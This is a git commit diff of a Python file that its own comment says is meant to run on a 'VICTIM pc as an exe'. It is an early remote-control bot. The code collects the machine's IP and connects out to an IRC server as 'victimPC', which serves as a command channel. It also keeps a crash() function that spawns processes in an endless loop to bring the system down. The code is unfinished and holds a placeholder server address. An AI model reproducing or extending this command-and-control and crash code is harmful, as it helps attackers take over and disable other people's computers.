6934d2471fed71e03c6e266d17a53941b58c71e0
Taha Amir <taha@taha.amir-ubuntu>
2017-10-03 00:07:41 -0400

    python connects/chats with irc server successfully

--- server.py
+++ server.py
@@ -1,24 +1,34 @@
 import socket 
 import os
 from requests import *
-import irc
+import irc.client
 
 #This file would be run on a VICTIM pc as an exe
 
 #grabbing private and public ip to show 
 private_ip = socket.gethostbyname(socket.gethostname())
-public_ip = get('https://api.ipify.org').text
+#public_ip = get('https://api.ipify.org').text
 
-#crash
-def crash():
-  while True:
-    os.system("start")
-
-#create socket object for getting commands from Slack
+#create socket object for getting commands from IRC
 s = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)
 s.bind(('', 80))
 
 
+def main():
+	print 'started'
+	reactor = irc.client.Reactor()
+	server = reactor.server()
+	server.connect(<ip to IRC server goes here>, 6667, 'victimPC')
+	server.privmsg('#general', 'rekt')
+	reactor.process_forever()
 
-#while connection exists
-#	check slack channel and execute commands as it comes
+
+
+#crash
+def crash():
+  while True:
+    os.system('start')
+
+
+if __name__ == '__main__':
+	main()
